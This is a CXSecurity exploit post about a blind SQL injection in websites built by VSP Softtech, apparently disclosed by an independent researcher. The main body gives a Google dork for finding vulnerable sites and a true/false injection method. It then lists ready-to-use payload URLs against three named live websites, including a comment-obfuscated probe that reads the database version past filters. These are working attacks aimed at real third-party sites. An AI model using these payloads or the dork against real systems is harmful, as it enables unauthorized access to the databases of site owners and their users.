---
title: VSP Softtech - Blind Sql Injection
url: https://cxsecurity.com/issue/WLB-2024050045
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-05-17
fetch_date: 2025-10-06T17:13:43.502769
---

# VSP Softtech - Blind Sql Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **VSP Softtech - Blind Sql Injection** **2024.05.16**  **![ir](https://cert.cx/cxstatic/images/flags/ir.png) [behrouz mansoori](https://cxsecurity.com/author/behrouz%2Bmansoori/1/) **(IR)** ![ir](https://cert.cx/cxstatic/images/flags/ir.png)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A**  **[**Dork:** "Developed by VSP Softtech"](https://cxsecurity.com/dorks/)** | |

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
#Exploit Title: VSP Softtech - Blind Sql Injection
#Date: 2024-05-16
#Exploit Author: Behrouz Mansoori
#Google Dork: "Developed by VSP Softtech"
#Category:webapps
#Tested On: Mac, Firefox
[+] First add "and true" and then "and false" to the end of the link :
\* Target.com/index.php?lang=1 true
\* Target.com/index.php?lang=1 false
### Demo 1:
\* https://indupharma.co.in/product-detail.php?id=96%27%20and%20true--+
\* https://indupharma.co.in/product-detail.php?id=96%27%20and%20false--+
\* https://indupharma.co.in/product-detail.php?id=96%27%20/\*!12345and\*/%20/\*!12345substring(@@version,1,1)\*/=5--+
### Demo 2:
\* https://waterlia.com/list\_profile.php?id=1%27%20and%20true--+
\* https://waterlia.com/list\_profile.php?id=1%27%20and%20false--+
\* https://waterlia.com/list\_profile.php?id=1%27%20/\*!12345and\*/%20/\*!12345substring(@@version,1,1)\*/=5--+
### Demo 3:
\* https://www.rajpathacademy.com/eng/book-details.php?id=173%27%20and%20true--+
\* https://www.rajpathacademy.com/eng/book-details.php?id=173%27%20and%20false--+
\* https://www.rajpathacademy.com/eng/book-details.php?id=173%27%20/\*!12345and\*/%20/\*!12345substring(@@version,1,1)\*/=5--+
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
#Discovered by: Behrouz mansoori
#Instagram: Behrouz\_mansoori
#Email: mr.mansoori@yahoo.com
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024050045)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top